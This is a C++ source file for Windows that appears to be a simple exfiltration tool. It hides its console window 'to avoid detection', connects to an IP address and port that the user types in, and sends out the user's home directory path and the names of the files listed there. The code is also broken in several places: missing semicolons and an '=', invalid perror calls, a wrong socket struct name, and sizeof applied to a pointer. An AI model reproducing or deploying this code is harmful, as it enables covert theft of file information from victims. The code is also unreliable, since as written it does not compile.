#define _WINSOCK_DEPRECATED_NO_WARNINGS // prevent compiler from moaning about older functionalities
#pragma comment(lib, "ws2_32.lib") // required to use sockets (networking)

#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <vector>
#include <string>

using namespace std;

// attempt to get the path of the user's home directory
char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath != NULL) {
        return pPath;
    }
    else {
        perror("Unable to find directory " << pPath); // print error and exit
    }
}

bool isNumber(const string& str)
{
    return !str.empty() && (str.find_first_not_of("[0123456789]") == std::string::npos);
}

vector<string> split(const string& str, char delim) {
    auto i = 0;
    vector<string> list;
    auto pos str.find(delim);

    while (pos != string::npos) {
        list.push_back(str.substr(i, pos - 1));
        i = ++pos;
        pos = str.find(delim, pos);
    }

    list.push_back(str.substr(i, str.length()));
    return list;
}

bool validIP(string ip) {
    vector<string> list = split(ip, '.');
    if (list.size() != 4) {
        return false;
    }

    for (string str : list) {
        if (!isNumber(str) || stoi(str) > 255 || stoi(str) < 0) {
            return false;
        }
    }

    return true;
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // don't show the window for this program to avoid detection by human eyes
    WSADATA WSAData; // struct to hold info about the windows socket implementation
    SOCKET server;
    SOCKET_IN addr; // store connection details

    string DESTINATION_ADDRESS;
    int DESTINATION_PORT;

    cout << "Please enter the destination IP address: ";
    cin >> DESTINATION_ADDRESS;
    cin.ignore()
    cout << "Please enter the destination port: ";
    cin >> DESTINATION_PORT;
    cin.ignore();

    if (!validIP(DESTINATION_ADDRESS)) {
        perror("Please enter a valid IP address format.\n")
    }

    WSAStartup(MAKEWORD(2, 0), &WSAData); // init winsock library usage
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr(DESTINATION_ADDRESS);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DESTINATION_PORT);
    connect(server, (SOCKADDR *)&addr, sizeof(addr)); // actual socket connection

    char* pPath  = userDirectory();
    send(server, pPath, sizeof(pPath), 0);

    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(pPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {// read the directory contents until all processed
            send(server, ent->d_name, sizeof(ent->d_name), 0);
        }
        closedir(dir);
    }
    else {
        perror("Unable to open directory " << dir);
    }

    closesocket(server);
    WSACleanup(); // clean up winsock library components
}